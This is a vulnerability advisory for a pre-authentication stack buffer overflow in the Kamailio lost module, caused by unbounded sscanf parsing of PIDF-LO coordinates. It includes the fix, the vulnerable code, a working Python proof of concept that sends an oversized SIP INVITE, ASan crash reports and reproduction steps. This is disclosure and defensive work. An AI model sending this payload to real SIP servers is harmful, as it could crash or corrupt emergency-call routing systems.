# lost: Pre-auth stack buffer overflow via sscanf in lost_parse_geo()

**Module**: lost
**Severity**: High (pre-auth stack overflow, attacker-controlled write size)
**Tested against**: kamailio commit `7c2d6bffa348` (2026-04-21)
**Fixed in**: [`7c6d17eb1d`](https://github.com/kamailio/kamailio/commit/7c6d17eb1d) ("lost: enhance lost_parse_geo to check for truncation of coordinates")
**Committed**: 2026-05-04 15:14:31 UTC
**Stable backports**: Kamailio 6.1 [`a88a6cbbb5`](https://github.com/kamailio/kamailio/commit/a88a6cbbb599c3faa0c88677107027ed13c311a5) (2026-05-18) and Kamailio 6.0 [`d7270e3ee8`](https://github.com/kamailio/kamailio/commit/d7270e3ee86e04d8335e80217f398839be564f94) (2026-06-16)

---

## Fix

The fix replaces the unbounded `"%s %s %s"` conversion with `"%127s %127s %127s"`, matching the three 128-byte destination buffers and reserving space for each terminating NUL byte. It also detects coordinate fields that reach the 127-character limit and logs that truncation was likely, preventing `sscanf()` from writing past the stack arrays.

`lost_parse_geo()` uses `sscanf(content, "%s %s %s", bufLat, bufLon, bufAlt)` to parse geographic coordinates from a PIDF-LO XML body into three 128-byte stack buffers. The `%s` format specifier has no width limit, so a `<gml:pos>` element with a coordinate string exceeding 127 characters overflows the corresponding stack buffer.

The content comes from a `<gml:pos>` XML element in a PIDF-LO body carried in a SIP INVITE or PUBLISH. No authentication is required — the vulnerable code path is reached before any credential validation, triggered when the routing script calls `lost_query()`.

## Vulnerable code

```c
// utilities.c:1009-1029 — lost_parse_geo()
char bufLat[BUFSIZE];   // BUFSIZE = 128, line 1009
char bufLon[BUFSIZE];   // line 1010
char bufAlt[BUFSIZE];   // line 1011

// ...
content = xmlNodeGetNodeContentByName(cur, "pos", NULL);  // line 1022 — from XML body

// ...
scan = sscanf(content, "%s %s %s", bufLat, bufLon, bufAlt);  // line 1029: NO WIDTH LIMIT
```

`sscanf` with `%s` writes until whitespace, with no bounds checking. The attacker controls `content` via the XML body, so a 256-byte latitude string writes 165 bytes past `bufLat[128]`, corrupting `bufLon`, `bufAlt`, and stack metadata.

## Call chain

```
udp_rcv_loop()
  → receive_msg()
    → run_top_route()
      → do_action()                      [routing script: lost_query(...)]
        → w_lost_query_all()
          → lost_function()
            → lost_parse_pidf()
              → lost_parse_location_info()
                → lost_parse_geo()       ← STACK OVERFLOW via sscanf
```

## PoC

```python
#!/usr/bin/env python3
"""
Kamailio lost module - sscanf %s stack buffer overflow in lost_parse_geo().

sscanf(content, "%s %s %s", bufLat, bufLon, bufAlt) parses <pos> element
content from PIDF-LO XML into 128-byte stack buffers without width limits.
A token exceeding 127 chars overflows the corresponding buffer.

Requires: lost.so + http_client.so loaded, routing script calls lost_query()
ASAN confirmed: commit 7c2d6bffa348
"""
import socket
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 5060

OVERFLOW_LAT = "9" * 256
BOUNDARY = "lost-boundary-poc"
CID = "loc-1@poc"

PIDF_PART = (
    f"--{BOUNDARY}\r\n"
    f"Content-Type: application/pidf+xml\r\n"
    f"Content-ID: <{CID}>\r\n"
    f"\r\n"
    f"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n"
    f"<presence xmlns=\"urn:ietf:params:xml:ns:pidf\"\r\n"
    f"          xmlns:gp=\"urn:ietf:params:xml:ns:pidf:geopriv10\"\r\n"
    f"          xmlns:gml=\"http://www.opengis.net/gml\"\r\n"
    f"          entity=\"sip:test@localhost\">\r\n"
    f"  <device id=\"d1\">\r\n"
    f"    <gp:geopriv>\r\n"
    f"      <gp:location-info>\r\n"
    f"        <gml:Point srsName=\"urn:ogc:def:crs:EPSG::4326\">\r\n"
    f"          <gml:pos>{OVERFLOW_LAT} -71.0 0.0</gml:pos>\r\n"
    f"        </gml:Point>\r\n"
    f"      </gp:location-info>\r\n"
    f"      <gp:usage-rules/>\r\n"
    f"    </gp:geopriv>\r\n"
    f"  </device>\r\n"
    f"</presence>\r\n"
    f"--{BOUNDARY}--\r\n"
)

SDP_PART = (
    f"--{BOUNDARY}\r\n"
    f"Content-Type: application/sdp\r\n"
    f"\r\n"
    f"v=0\r\no=- 0 0 IN IP4 0.0.0.0\r\ns=-\r\n"
    f"c=IN IP4 0.0.0.0\r\nt=0 0\r\nm=audio 0 RTP/AVP 0\r\n"
    f"\r\n"
)

BODY = SDP_PART + PIDF_PART

msg = (
    f"INVITE urn:service:sos SIP/2.0\r\n"
    f"Via: SIP/2.0/UDP 192.168.65.1:19999;rport;branch=z9hG4bKlost1\r\n"
    f"From: <sip:caller@localhost>;tag=lost1\r\n"
    f"To: <urn:service:sos>\r\n"
    f"Call-ID: lost-poc@poc\r\n"
    f"CSeq: 1 INVITE\r\n"
    f"Max-Forwards: 70\r\n"
    f"Geolocation: <cid:{CID}>\r\n"
    f"Content-Type: multipart/mixed;boundary={BOUNDARY}\r\n"
    f"Content-Length: {len(BODY)}\r\n"
    f"\r\n"
    f"{BODY}"
).encode()

print(f"[*] PIDF-LO with latitude={len(OVERFLOW_LAT)} chars (overflows 128-byte bufLat)")
print(f"[*] Sending to {TARGET}:{PORT}")

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(3)
s.sendto(msg, (TARGET, PORT))
try:
    resp = s.recv(4096)
    print(f"[*] Reply: {resp[:60].decode(errors='replace')}")
except socket.timeout:
    print(f"[!] No reply -- check ASAN log")
s.close()
```

## ASan output

Three violations fire sequentially: the `sscanf` WRITE overflows `bufLat`, then `strlen` and `snprintf` READ the corrupted region:

**Report 1: sscanf WRITE overflows bufLat[128]**

```
=================================================================
==7==ERROR: AddressSanitizer: stack-buffer-overflow on address 0xfffffcb9f180 at pc 0xaaaad249c598 bp 0xfffffcb9eeb0 sp 0xfffffcb9e698
WRITE of size 166 at 0xfffffcb9f180 thread T0
    #0 0xaaaad249c594 in scanf_common(void*, int, bool, char const*, std::__va_list) asan_interceptors.cpp.o
    #1 0xaaaad249d478 in __interceptor___isoc99_sscanf (/usr/local/sbin/kamailio+0x25d478) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9)
    #2 0xffffa919c770 in lost_parse_geo /usr/src/kamailio/build/src/modules/lost/utilities.c:1029:9
    #3 0xffffa919b17c in lost_parse_location_info /usr/src/kamailio/build/src/modules/lost/utilities.c:1390:5
    #4 0xffffa9198480 in lost_parse_pidf /usr/src/kamailio/build/src/modules/lost/utilities.c:926:6
    #5 0xffffa914177c in lost_function /usr/src/kamailio/build/src/modules/lost/functions.c:1060:9
    #6 0xffffa915c070 in w_lost_query /usr/src/kamailio/build/src/modules/lost/lost.c:428:9
    #7 0xaaaad2569304 in do_action /usr/src/kamailio/build/src/core/action.c:1141:4
    #8 0xaaaad258d844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #9 0xaaaad256cfa4 in do_action /usr/src/kamailio/build/src/core/action.c
    #10 0xaaaad258d844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #11 0xaaaad2590390 in run_top_route /usr/src/kamailio/build/src/core/action.c:1703:8
    #12 0xaaaad2a91c7c in receive_msg /usr/src/kamailio/build/src/core/receive.c:535:8
    #13 0xaaaad2d811b0 in udp_rcv_loop /usr/src/kamailio/build/src/core/udp_server.c:1420:4
    #14 0xaaaad2544b28 in main_loop /usr/src/kamailio/build/src/main.c
    #15 0xaaaad255ee58 in main /usr/src/kamailio/build/src/main.c:3439:8
    #16 0xffffae877740  (/lib/aarch64-linux-gnu/libc.so.6+0x27740) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #17 0xffffae877814 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x27814) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #18 0xaaaad247f56c in _start (/usr/local/sbin/kamailio+0x23f56c) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9)

Address 0xfffffcb9f180 is located in stack of thread T0 at offset 160 in frame
    #0 0xffffa919c60c in lost_parse_geo /usr/src/kamailio/build/src/modules/lost/utilities.c:1006

  This frame has 8 object(s):
    [32, 160) 'bufLat' (line 1009)
    [192, 320) 'bufLon' (line 1010) <== Memory access at offset 160 partially underflows this variable
    [352, 480) 'bufAlt' (line 1011)
    [512, 516) 'iRadius' (line 1016)
    [528, 592) '__kld' (line 1025)
    [624, 688) '__kld103' (line 1033)
    [720, 784) '__kld259' (line 1056)
    [816, 880) '__kld465' (line 1106)
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow asan_interceptors.cpp.o in scanf_common(void*, int, bool, char const*, std::__va_list)
Shadow bytes around the buggy address:
  0x200fff973de0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200fff973df0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200fff973e00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200fff973e10: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1
  0x200fff973e20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200fff973e30:[f2]f2 f2 f2 00 00 00 00 00 00 00 00 00 00 00 00
  0x200fff973e40: 00 00 00 00 f2 f2 f2 f2 00 00 00 00 00 00 00 00
  0x200fff973e50: 00 00 00 00 00 00 00 00 f2 f2 f2 f2 04 f2 f8 f8
  0x200fff973e60: f8 f8 f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8 f8 f8
  0x200fff973e70: f8 f8 f2 f2 f2 f2 f8 f8 f8 f8 f8 f8 f8 f8 f2 f2
  0x200fff973e80: f2 f2 f8 f8 f8 f8 f8 f8 f8 f8 f3 f3 f3 f3 f3 f3
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
```

**Report 2: strlen READ from overflowed bufLat**

```
=================================================================
==7==ERROR: AddressSanitizer: stack-buffer-overflow on address 0xfffffcb9f180 at pc 0xaaaad2493034 bp 0xfffffcb9f0a0 sp 0xfffffcb9e890
READ of size 166 at 0xfffffcb9f180 thread T0
    #0 0xaaaad2493030 in strlen (/usr/local/sbin/kamailio+0x253030) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9)
    #1 0xffffa919cb44 in lost_parse_geo /usr/src/kamailio/build/src/modules/lost/utilities.c:1037:8
    #2 0xffffa919b17c in lost_parse_location_info /usr/src/kamailio/build/src/modules/lost/utilities.c:1390:5
    #3 0xffffa9198480 in lost_parse_pidf /usr/src/kamailio/build/src/modules/lost/utilities.c:926:6
    #4 0xffffa914177c in lost_function /usr/src/kamailio/build/src/modules/lost/functions.c:1060:9
    #5 0xffffa915c070 in w_lost_query /usr/src/kamailio/build/src/modules/lost/lost.c:428:9
    #6 0xaaaad2569304 in do_action /usr/src/kamailio/build/src/core/action.c:1141:4
    #7 0xaaaad258d844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #8 0xaaaad256cfa4 in do_action /usr/src/kamailio/build/src/core/action.c
    #9 0xaaaad258d844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #10 0xaaaad2590390 in run_top_route /usr/src/kamailio/build/src/core/action.c:1703:8
    #11 0xaaaad2a91c7c in receive_msg /usr/src/kamailio/build/src/core/receive.c:535:8
    #12 0xaaaad2d811b0 in udp_rcv_loop /usr/src/kamailio/build/src/core/udp_server.c:1420:4
    #13 0xaaaad2544b28 in main_loop /usr/src/kamailio/build/src/main.c
    #14 0xaaaad255ee58 in main /usr/src/kamailio/build/src/main.c:3439:8
    #15 0xffffae877740  (/lib/aarch64-linux-gnu/libc.so.6+0x27740) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #16 0xffffae877814 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x27814) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #17 0xaaaad247f56c in _start (/usr/local/sbin/kamailio+0x23f56c) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9)

Address 0xfffffcb9f180 is located in stack of thread T0 at offset 160 in frame
    #0 0xffffa919c60c in lost_parse_geo /usr/src/kamailio/build/src/modules/lost/utilities.c:1006

  This frame has 8 object(s):
    [32, 160) 'bufLat' (line 1009)
    [192, 320) 'bufLon' (line 1010) <== Memory access at offset 160 partially underflows this variable
    [352, 480) 'bufAlt' (line 1011)
    [512, 516) 'iRadius' (line 1016)
    [528, 592) '__kld' (line 1025)
    [624, 688) '__kld103' (line 1033)
    [720, 784) '__kld259' (line 1056)
    [816, 880) '__kld465' (line 1106)
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow (/usr/local/sbin/kamailio+0x253030) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9) in strlen
Shadow bytes around the buggy address:
  0x200fff973de0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200fff973df0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200fff973e00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200fff973e10: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1
  0x200fff973e20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200fff973e30:[f2]f2 f2 f2 00 00 00 00 00 00 00 00 00 00 00 00
  0x200fff973e40: 00 00 00 00 f2 f2 f2 f2 00 00 00 00 00 00 00 00
  0x200fff973e50: 00 00 00 00 00 00 00 00 f2 f2 f2 f2 04 f2 f8 f8
  0x200fff973e60: f8 f8 f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8 f8 f8
  0x200fff973e70: f8 f8 f2 f2 f2 f2 f8 f8 f8 f8 f8 f8 f8 f8 f2 f2
  0x200fff973e80: f2 f2 f8 f8 f8 f8 f8 f8 f8 f8 f3 f3 f3 f3 f3 f3
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
```

**Report 3: snprintf READ from overflowed bufLat**

```
=================================================================
==7==ERROR: AddressSanitizer: stack-buffer-overflow on address 0xfffffcb9f180 at pc 0xaaaad249de18 bp 0xfffffcb9e660 sp 0xfffffcb9de48
READ of size 166 at 0xfffffcb9f180 thread T0
    #0 0xaaaad249de14 in printf_common(void*, char const*, std::__va_list) asan_interceptors.cpp.o
    #1 0xaaaad249e07c in __interceptor_vsnprintf (/usr/local/sbin/kamailio+0x25e07c) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9)
    #2 0xaaaad249f7e0 in __interceptor_snprintf (/usr/local/sbin/kamailio+0x25f7e0) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9)
    #3 0xffffa919cbd8 in lost_parse_geo /usr/src/kamailio/build/src/modules/lost/utilities.c:1042:2
    #4 0xffffa919b17c in lost_parse_location_info /usr/src/kamailio/build/src/modules/lost/utilities.c:1390:5
    #5 0xffffa9198480 in lost_parse_pidf /usr/src/kamailio/build/src/modules/lost/utilities.c:926:6
    #6 0xffffa914177c in lost_function /usr/src/kamailio/build/src/modules/lost/functions.c:1060:9
    #7 0xffffa915c070 in w_lost_query /usr/src/kamailio/build/src/modules/lost/lost.c:428:9
    #8 0xaaaad2569304 in do_action /usr/src/kamailio/build/src/core/action.c:1141:4
    #9 0xaaaad258d844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #10 0xaaaad256cfa4 in do_action /usr/src/kamailio/build/src/core/action.c
    #11 0xaaaad258d844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #12 0xaaaad2590390 in run_top_route /usr/src/kamailio/build/src/core/action.c:1703:8
    #13 0xaaaad2a91c7c in receive_msg /usr/src/kamailio/build/src/core/receive.c:535:8
    #14 0xaaaad2d811b0 in udp_rcv_loop /usr/src/kamailio/build/src/core/udp_server.c:1420:4
    #15 0xaaaad2544b28 in main_loop /usr/src/kamailio/build/src/main.c
    #16 0xaaaad255ee58 in main /usr/src/kamailio/build/src/main.c:3439:8
    #17 0xffffae877740  (/lib/aarch64-linux-gnu/libc.so.6+0x27740) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #18 0xffffae877814 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x27814) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #19 0xaaaad247f56c in _start (/usr/local/sbin/kamailio+0x23f56c) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9)

Address 0xfffffcb9f180 is located in stack of thread T0 at offset 160 in frame
    #0 0xffffa919c60c in lost_parse_geo /usr/src/kamailio/build/src/modules/lost/utilities.c:1006

  This frame has 8 object(s):
    [32, 160) 'bufLat' (line 1009)
    [192, 320) 'bufLon' (line 1010) <== Memory access at offset 160 partially underflows this variable
    [352, 480) 'bufAlt' (line 1011)
    [512, 516) 'iRadius' (line 1016)
    [528, 592) '__kld' (line 1025)
    [624, 688) '__kld103' (line 1033)
    [720, 784) '__kld259' (line 1056)
    [816, 880) '__kld465' (line 1106)
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow asan_interceptors.cpp.o in printf_common(void*, char const*, std::__va_list)
Shadow bytes around the buggy address:
  0x200fff973de0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200fff973df0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200fff973e00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200fff973e10: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1
  0x200fff973e20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200fff973e30:[f2]f2 f2 f2 00 00 00 00 00 00 00 00 00 00 00 00
  0x200fff973e40: 00 00 00 00 f2 f2 f2 f2 00 00 00 00 00 00 00 00
  0x200fff973e50: 00 00 00 00 00 00 00 00 f2 f2 f2 f2 04 f2 f8 f8
  0x200fff973e60: f8 f8 f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8 f8 f8
  0x200fff973e70: f8 f8 f2 f2 f2 f2 f8 f8 f8 f8 f8 f8 f8 f8 f2 f2
  0x200fff973e80: f2 f2 f8 f8 f8 f8 f8 f8 f8 f8 f3 f3 f3 f3 f3 f3
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
```

## Build & reproduce

```bash
git clone https://github.com/kamailio/kamailio.git
cd kamailio && git checkout 7c2d6bffa348

mkdir build && cd build
CC=clang cmake .. \
    -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -O1 -g" \
    -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address" \
    -DCMAKE_SHARED_LINKER_FLAGS="-fsanitize=address"
make -j$(nproc) && make install

# kamailio.cfg must load lost + http_client and call lost_query():
#   loadmodule "lost.so"
#   loadmodule "http_client.so"
#   route { if(is_method("INVITE")) { lost_query("urn:service:sos", ...); } }

ASAN_OPTIONS="detect_leaks=0:halt_on_error=0:log_path=/tmp/asan" \
    kamailio -DD -E -f kamailio.cfg

python3 poc.py 127.0.0.1 5060
cat /tmp/asan.*
```
